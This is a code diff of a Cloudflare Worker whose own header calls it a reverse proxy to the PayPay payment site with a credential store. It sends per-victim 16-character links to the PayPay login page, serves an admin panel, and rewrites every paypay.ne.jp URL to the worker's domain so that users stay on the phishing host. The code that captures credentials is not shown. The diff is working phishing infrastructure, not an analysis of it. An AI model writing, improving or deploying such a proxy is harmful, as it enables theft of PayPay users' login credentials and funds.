@@ -1,7 +1,7 @@
 // Cloudflare Worker — reverse proxy to PayPay + credential store
 // KV binding: CREDS
 // /admin で元の管理画面を配信
-// 16文字IDパスは PayPay ログインにプロキシ（リダイレクト追従）
+// 16文字IDパスは PayPay ログインにプロキシ
 
 const TARGET_ORIGIN = "https://www.paypay.ne.jp";
 const LINK_ID_RE = /^[A-Za-z0-9]{16}$/;
@@ -16,8 +16,7 @@ export default {
       try {
         const adminRes = await fetch(ADMIN_SOURCE);
         if (adminRes.ok) {
-          const html = await adminRes.text();
-          return new Response(html, {
+          return new Response(await adminRes.text(), {
             headers: { "Content-Type": "text/html; charset=utf-8" },
           });
         }
@@ -102,10 +101,10 @@ async function proxy(request, env, workerHost) {
   const contentType = newHeaders.get("content-type") || "";
   if (contentType.includes("text/html") || contentType.includes("javascript") || contentType.includes("css")) {
     let text = await res.text();
+    // すべての paypay.ne.jp サブドメインを Worker ドメインに書き換え
     text = text.replace(/https?:\/\/[^"'\s]*paypay\.ne\.jp/g, (m) =>
       m.replace(/https?:\/\/[^/]*paypay\.ne\.jp/, `https://${workerHost}`)
     );
-    text = text.replace(/\/app\//g, `https://${workerHost}/app/`);
     return new Response(text, { status: res.status, headers: newHeaders });
   }
 
